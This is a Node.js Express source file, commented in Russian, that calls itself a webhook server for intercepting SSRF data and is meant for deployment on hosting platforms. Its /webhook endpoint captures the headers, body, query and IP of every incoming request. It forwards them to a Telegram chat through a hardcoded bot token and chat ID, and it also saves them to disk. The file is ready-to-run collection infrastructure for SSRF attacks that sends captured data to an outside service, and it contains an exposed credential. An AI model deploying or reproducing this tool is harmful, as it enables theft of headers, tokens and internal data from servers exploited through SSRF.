// Простой webhook сервер для перехвата SSRF данных
// Деплой на Vercel/Netlify/Railway

const express = require('express');
const axios = require('axios');
const app = express();

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8289612172:AAGuPa3TUpW3mVsIxtaZNHfdllm5Gnr7tdQ';
const TELEGRAM_CHAT_ID = '8557908446';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text());
app.use(express.raw());

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Отправлено в Telegram');
    } catch (error) {
        console.error('❌ Ошибка отправки в Telegram:', error.message);
    }
}

// Главный webhook endpoint
app.all('/webhook', async (req, res) => {
    console.log('🔥 ПОЛУЧЕН WEBHOOK!');
    
    const timestamp = new Date().toISOString();
    
    // Собираем все данные
    const data = {
        timestamp,
        method: req.method,
        url: req.url,
        headers: req.headers,
        query: req.query,
        body: req.body,
        ip: req.ip || req.connection.remoteAddress
    };
    
    console.log('📦 Данные:', JSON.stringify(data, null, 2));
    
    // Формируем сообщение для Telegram
    let message = `🔥 <b>SSRF WEBHOOK ПОЛУЧЕН!</b>\n\n`;
    message += `⏰ <b>Время:</b> ${timestamp}\n`;
    message += `🌐 <b>IP:</b> ${data.ip}\n`;
    message += `📍 <b>Method:</b> ${data.method}\n`;
    message += `🔗 <b>URL:</b> ${data.url}\n\n`;
    
    // Headers
    message += `📋 <b>Headers:</b>\n`;
    for (const [key, value] of Object.entries(data.headers)) {
        message += `  • ${key}: ${value}\n`;
    }
    
    // Body
    if (data.body && Object.keys(data.body).length > 0) {
        message += `\n📦 <b>Body:</b>\n`;
        message += `<code>${JSON.stringify(data.body, null, 2)}</code>\n`;
    }
    
    // Query params
    if (data.query && Object.keys(data.query).length > 0) {
        message += `\n🔍 <b>Query:</b>\n`;
        message += `<code>${JSON.stringify(data.query, null, 2)}</code>\n`;
    }
    
    // Отправляем в Telegram
    await sendToTelegram(message);
    
    // Сохраняем в файл (для логов)
    const fs = require('fs');
    const logFile = `./logs/${timestamp.replace(/:/g, '-')}.json`;
    try {
        if (!fs.existsSync('./logs')) {
            fs.mkdirSync('./logs');
        }
        fs.writeFileSync(logFile, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error('Ошибка записи в файл:', err);
    }
    
    // Отвечаем успехом
    res.status(200).json({
        success: true,
        message: 'Webhook received',
        timestamp
    });
});

// Корневой endpoint
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>Webhook Server</title></head>
            <body style="font-family: monospace; padding: 20px;">
                <h1>🔥 Webhook Server Active</h1>
                <p>Endpoint: <code>/webhook</code></p>
                <p>Status: <span style="color: green;">✅ Online</span></p>
                <p>Time: ${new Date().toISOString()}</p>
            </body>
        </html>
    `);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Webhook server running on port ${PORT}`);
    console.log(`📍 Webhook URL: http://localhost:${PORT}/webhook`);
});
